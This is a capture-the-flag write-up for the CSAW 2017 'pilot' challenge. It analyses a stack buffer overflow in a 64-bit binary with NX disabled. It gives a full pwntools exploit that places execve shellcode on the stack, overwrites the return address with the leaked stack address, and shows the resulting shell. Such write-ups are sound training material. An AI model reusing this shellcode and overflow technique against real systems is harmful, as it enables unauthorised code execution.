### Binary Exploitation

#### Source: CSAW_17

### Basic File Check

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/pilot]
└─$ file pilot      
pilot: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6ed26a43b94fd3ff1dd15964e4106df72c01dc6c, stripped
                                                                                                                                                                                                                   
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/pilot]
└─$ checksec pilot 
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Documents/Pentest/BOF/03-begineer_bof/pilot/pilot'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

We see that no protection is enabled on this binary which is a x64 binary

Also whats of interest to us is that `NX (No-Execute)` is disabled meaning that if we can cause a buffer overflow we will be abled to inject shellcode on the stack and execute i

I'll run the binary to know what it does

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/pilot]
└─$ ./pilot     
[*]Welcome DropShip Pilot...
[*]I am your assitant A.I....
[*]I will be guiding you through the tutorial....
[*]As a first step, lets learn how to land at the designated location....
[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...
[*]Good Luck Pilot!....
[*]Location:0x7fffc8f7d030
[*]Command:pwned
```

We see it prints some text the an address which changes anytime the binary is run and it looks like an address of the stack

Also we're given an input function

Decompiling the binary using ghidra gives this

```

undefined8 FUN_004009a6(void)

{
  basic_ostream *pbVar1;
  basic_ostream<char,std::char_traits<char>> *this;
  ssize_t sVar2;
  undefined8 uVar3;
  undefined local_28 [32];
  
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  pbVar1 = std::operator<<((basic_ostream *)std::cout,"[*]Welcome DropShip Pilot...");
  std::basic_ostream<char,std::char_traits<char>>::operator<<
            ((basic_ostream<char,std::char_traits<char>> *)pbVar1,
             std::endl<char,std::char_traits<char>>);
  pbVar1 = std::operator<<((basic_ostream *)std::cout,"[*]I am your assitant A.I....");
  std::basic_ostream<char,std::char_traits<char>>::operator<<
            ((basic_ostream<char,std::char_traits<char>> *)pbVar1,
             std::endl<char,std::char_traits<char>>);
  pbVar1 = std::operator<<((basic_ostream *)std::cout,
                           "[*]I will be guiding you through the tutorial....");
  std::basic_ostream<char,std::char_traits<char>>::operator<<
            ((basic_ostream<char,std::char_traits<char>> *)pbVar1,
             std::endl<char,std::char_traits<char>>);
  pbVar1 = std::operator<<((basic_ostream *)std::cout,
                           "[*]As a first step, lets learn how to land at the designated location... ."
                          );
  std::basic_ostream<char,std::char_traits<char>>::operator<<
            ((basic_ostream<char,std::char_traits<char>> *)pbVar1,
             std::endl<char,std::char_traits<char>>);
  pbVar1 = std::operator<<((basic_ostream *)std::cout,
                           "[*]Your mission is to lead the dropship to the right location and execut e sequence of instructions to save Marines & Medics..."
                          );
  std::basic_ostream<char,std::char_traits<char>>::operator<<
            ((basic_ostream<char,std::char_traits<char>> *)pbVar1,
             std::endl<char,std::char_traits<char>>);
  pbVar1 = std::operator<<((basic_ostream *)std::cout,"[*]Good Luck Pilot!....");
  std::basic_ostream<char,std::char_traits<char>>::operator<<
            ((basic_ostream<char,std::char_traits<char>> *)pbVar1,
             std::endl<char,std::char_traits<char>>);
  pbVar1 = std::operator<<((basic_ostream *)std::cout,"[*]Location:");
  this = (basic_ostream<char,std::char_traits<char>> *)
         std::basic_ostream<char,std::char_traits<char>>::operator<<
                   ((basic_ostream<char,std::char_traits<char>> *)pbVar1,local_28);
  std::basic_ostream<char,std::char_traits<char>>::operator<<
            (this,std::endl<char,std::char_traits<char>>);
  std::operator<<((basic_ostream *)std::cout,"[*]Command:");
  sVar2 = read(0,local_28,0x40);
  if (sVar2 < 5) {
    pbVar1 = std::operator<<((basic_ostream *)std::cout,"[*]There are no commands....");
    std::basic_ostream<char,std::char_traits<char>>::operator<<
              ((basic_ostream<char,std::char_traits<char>> *)pbVar1,
               std::endl<char,std::char_traits<char>>);
    pbVar1 = std::operator<<((basic_ostream *)std::cout,"[*]Mission Failed....");
    std::basic_ostream<char,std::char_traits<char>>::operator<<
              ((basic_ostream<char,std::char_traits<char>> *)pbVar1,
               std::endl<char,std::char_traits<char>>);
    uVar3 = 0xffffffff;
  }
  else {
    uVar3 = 0;
  }
  return uVar3;
}

```

Boyyy C++ looks painful to me 😹

Anyways the main function which looks interesting to me is the read function

```
sVar2 = read(0,local_28,0x40);
```

Its reading 0x40 bytes as input and storing in local_28 

And local_28 is the buffer

```
undefined local_28 [32];
```

Here we have a buffer overflow vulnerability cause we're allowed to write 0x40 bytes into a 0x20 bytes buffer

This gives us extra bytes `0x40 - 0x20 = 0x20` to overflow the buffer

I'll hop on to gdb to get the right offset needed to overflow the buffer

Setting a breakpoint at the next intruction after read

```
└─$ gdb -q pilot
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 12.1 in 0.00ms using Python engine 3.11
Reading symbols from pilot...
(No debugging symbols found in pilot)
gef➤  b *0x0400ae5
Breakpoint 1 at 0x400ae5
gef➤  r
Starting program: /home/mark/Documents/Pentest/BOF/03-begineer_bof/pilot/pilot 
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0x7ffff7fc9000'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[*]Welcome DropShip Pilot...
[*]I am your assitant A.I....
[*]I will be guiding you through the tutorial....
[*]As a first step, lets learn how to land at the designated location....
[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...
[*]Good Luck Pilot!....
[*]Location:0x7fffffffdde0
[*]Command:1234567890

Breakpoint 1, 0x0000000000400ae5 in ?? ()



























[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xb               
$rbx   : 0x007fffffffdf18  →  0x007fffffffe27e  →  "/home/mark/Documents/Pentest/BOF/03-begineer_bof/p[...]"
$rcx   : 0x007ffff7b1702d  →  0x5b77fffff0003d48 ("H="?)
$rdx   : 0x40              
$rsp   : 0x007fffffffdde0  →  0x3837363534333231 ("12345678"?)
$rbp   : 0x007fffffffde00  →  0x0000000000000001
$rsi   : 0x007fffffffdde0  →  0x3837363534333231 ("12345678"?)
$rdi   : 0x0               
$rip   : 0x00000000400ae5  →   cmp rax, 0x4
$r8    : 0x0               
$r9    : 0x007fffffffdcb0  →  0x0000000000000000
$r10   : 0x007ffff7a2eb40  →  0x0010001200001a7e
$r11   : 0x246             
$r12   : 0x0               
$r13   : 0x007fffffffdf28  →  0x007fffffffe2bb  →  "COLORFGBG=15;0"
$r14   : 0x0               
$r15   : 0x007ffff7ffd020  →  0x007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero CARRY parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffdde0│+0x0000: 0x3837363534333231     ← $rsp, $rsi
0x007fffffffdde8│+0x0008: 0x00007ffff70a3039
0x007fffffffddf0│+0x0010: 0x00000000602070  →   add BYTE PTR [rax], al
0x007fffffffddf8│+0x0018: 0x007ffff7a5cdc8  →  <__internal_atexit+56> test rax, rax
0x007fffffffde00│+0x0020: 0x0000000000000001     ← $rbp
0x007fffffffde08│+0x0028: 0x007ffff7a4618a  →  <__libc_start_call_main+122> mov edi, eax
0x007fffffffde10│+0x0030: 0x007fffffffde50  →  0x0000000000000000
0x007fffffffde18│+0x0038: 0x000000004009a6  →   push rbp
─────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400ad8                  mov    rsi, rax
     0x400adb                  mov    edi, 0x0
     0x400ae0                  call   0x400820 <read@plt>
 →   0x400ae5                  cmp    rax, 0x4
     0x400ae9                  setle  al
     0x400aec                  test   al, al
     0x400aee                  je     0x400b2f
     0x400af0                  mov    esi, 0x400d90
     0x400af5                  mov    edi, 0x6020a0
─────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "pilot", stopped 0x400ae5 in ?? (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400ae5 → cmp rax, 0x4
[#1] 0x7ffff7a4618a → __libc_start_call_main(main=0x4009a6, argc=0x1, argv=0x7fffffffdf18)
[#2] 0x7ffff7a46245 → __libc_start_main_impl(main=0x4009a6, argc=0x1, argv=0x7fffffffdf18, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffdf08)
[#3] 0x4008d9 → hlt 
────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Cool now i'll search for our input on the stack and also the address of $rip

```
gef➤  search-pattern 1234567890
[+] Searching '1234567890' in memory
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rwx
  0x7fffffffdde0 - 0x7fffffffddea  →   "1234567890[...]" 
gef➤  i f
Stack level 0, frame at 0x7fffffffde10:
 rip = 0x400ae5; saved rip = 0x7ffff7a4618a
 called by frame at 0x7fffffffdeb0
 Arglist at 0x7fffffffddd8, args: 
 Locals at 0x7fffffffddd8, Previous frame's sp is 0x7fffffffde10
 Saved registers:
  rbp at 0x7fffffffde00, rip at 0x7fffffffde08
gef➤  
```

With this lets do the calculation to get the offset from input to the instruction pointer

```
0x7fffffffde08-0x7fffffffdde0 = 0x28
```

Cool also now we know that the binary already gives us an address to use for our exploit making

```
  pbVar1 = std::operator<<((basic_ostream *)std::cout,"[*]Location:");
  this = (basic_ostream<char,std::char_traits<char>> *)
         std::basic_ostream<char,std::char_traits<char>>::operator<<
                   ((basic_ostream<char,std::char_traits<char>> *)pbVar1,local_28);
  std::basic_ostream<char,std::char_traits<char>>::operator<<
            (this,std::endl<char,std::char_traits<char>>);
```

So here's how the exploit will go

```
1. Overwrite the rip
2. Put shellcode on the stack
3. Change return address to the address leaked already when the program is run
```

So now we have that here's the exploit

```
from pwn import *

io = process('./pilot')
print io.recvuntil('[*]Location:')
leak = io.recvline()

addr = int(leak.strip("\n"), 16) 

payload = "" 

payload += "\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05" 

payload += "A"*(0x28 - len(payload))

payload += p64(addr)

io.sendline(payload)
io.interactive()
```

Lets run it now 

```
└─$ python2 exploit.py 
[+] Starting local process './pilot': pid 26187
[*]Welcome DropShip Pilot...
[*]I am your assitant A.I....
[*]I will be guiding you through the tutorial....
[*]As a first step, lets learn how to land at the designated location....
[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...
[*]Good Luck Pilot!....
[*]Location:
[*] Switching to interactive mode
[*]Command:$ 
$ ls
exploit.py  pilot
$ id
uid=1000(mark) gid=1000(mark) groups=1000(mark),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),121(bluetooth),137(scanner),142(kaboxer)
$ whoami
mark
$
```

And we're done 

<br> <br>

[Back To Home](../../index.md)

